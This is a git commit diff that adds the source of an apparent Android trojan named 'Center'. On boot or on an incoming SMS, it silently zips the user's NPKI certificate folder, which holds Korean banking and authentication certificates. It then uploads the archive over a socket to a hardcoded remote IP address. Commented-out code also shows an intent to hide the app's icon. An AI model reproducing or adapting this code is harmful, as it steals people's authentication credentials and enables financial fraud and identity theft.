ea007064d04e25501aa2f60bc425a69668bf9996
soooooo6 <Qjdclsp@gmail.com>
2014-09-11 13:47:14 +0900

    share project

---
+++ Center/src/com/example/center/MainActivity.java
@@ -0,0 +1,23 @@
+package com.example.center;
+
+import android.app.Activity;
+import android.content.BroadcastReceiver;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.Bundle;
+
+public class MainActivity extends Activity {
+
+/*	private void tryHidIcon(){
+		getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
+	}*/
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		Intent intent = new Intent(this, MyService.class);
+		startService(intent);
+//		tryHidIcon();
+		finish();
+	}
+}
---
+++ Center/src/com/example/center/MyService.java
@@ -0,0 +1,127 @@
+package com.example.center;
+
+import java.io.BufferedWriter;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
+import java.net.Socket;
+
+import net.lingala.zip4j.core.ZipFile;
+import net.lingala.zip4j.model.ZipParameters;
+import net.lingala.zip4j.util.Zip4jConstants;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.Environment;
+import android.os.IBinder;
+import android.widget.Toast;
+
+
+public class MyService extends Service {
+	
+	private String msg = "test";
+	private BroadcastReceiver myReceiver= new BroadcastReceiver(){
+		
+		@Override
+		public void onReceive(Context context, Intent intent) {
+			 try {
+
+				 ZipFile zipfile = new ZipFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "npki.zip");
+				 ZipParameters parameters = new ZipParameters();
+				 parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);
+				 parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);
+				 zipfile.addFolder(Environment.getExternalStorageDirectory().getAbsolutePath() + "/NPKI", parameters);
+				 } catch (Exception e) {
+				 }
+			 
+			 sock();
+		}
+	};
+	
+	@Override
+	public void onCreate(){
+		super.onCreate();
+		Toast.makeText(this, "onCreate", Toast.LENGTH_SHORT).show();		
+	}
+	
+	@Override
+	public void onDestroy(){
+		super.onDestroy();
+		Toast.makeText(this, "onDestroy", Toast.LENGTH_SHORT).show();
+	}
+	
+	@Override
+	public void onRebind(Intent intent){
+		super.onRebind(intent);
+		Toast.makeText(this, "onRebind", Toast.LENGTH_SHORT).show();
+	}
+	
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId){
+		Toast.makeText(this, "onStartCommand", Toast.LENGTH_SHORT).show();
+		
+		IntentFilter intentFilter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
+        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");	
+		
+		registerReceiver(myReceiver, intentFilter);
+		
+		return super.onStartCommand(intent, flags, startId);
+	}
+		
+	@Override
+	public boolean onUnbind(Intent intent){
+		Toast.makeText(this, "onUnbind", Toast.LENGTH_SHORT).show();
+		return super.onUnbind(intent);
+	}
+	
+	@Override
+	public IBinder onBind(Intent intent) {
+		// TODO Auto-generated method stub
+		Toast.makeText(this, "onBind", Toast.LENGTH_SHORT).show();
+		return null;
+	}
+	
+	public void sock(){
+		try{
+			String host = "203.249.6.99";		//서버 ip주소
+			int port = 9000;
+			
+			Socket sock = new Socket(host, port);
+			try{
+				PrintWriter out = new PrintWriter(new BufferedWriter(new 
+						OutputStreamWriter(sock.getOutputStream())), true);
+				out.println(msg);
+				out.flush();
+				
+				File dir = Environment.getExternalStorageDirectory();
+				
+				DataInputStream dis = new DataInputStream(new 
+						FileInputStream(new File(dir + "/" + "npki" + ".zip")));
+				DataOutputStream dos = new DataOutputStream(sock.getOutputStream());
+        		byte[]  buf = new byte[1024];
+        		int read_length = 0;
+        		while((read_length = dis.read(buf)) > 0){
+        			dos.write(buf, 0, read_length);
+        			dos.flush();
+        		}
+        		dos.close();
+        		dis.close();
+        		sock.close();
+			} catch (Exception e){
+				e.printStackTrace();
+			} finally {
+				sock.close();
+			}
+		} catch(Exception e){
+			e.printStackTrace();
+		}
+	}
+	
+
+	
+}
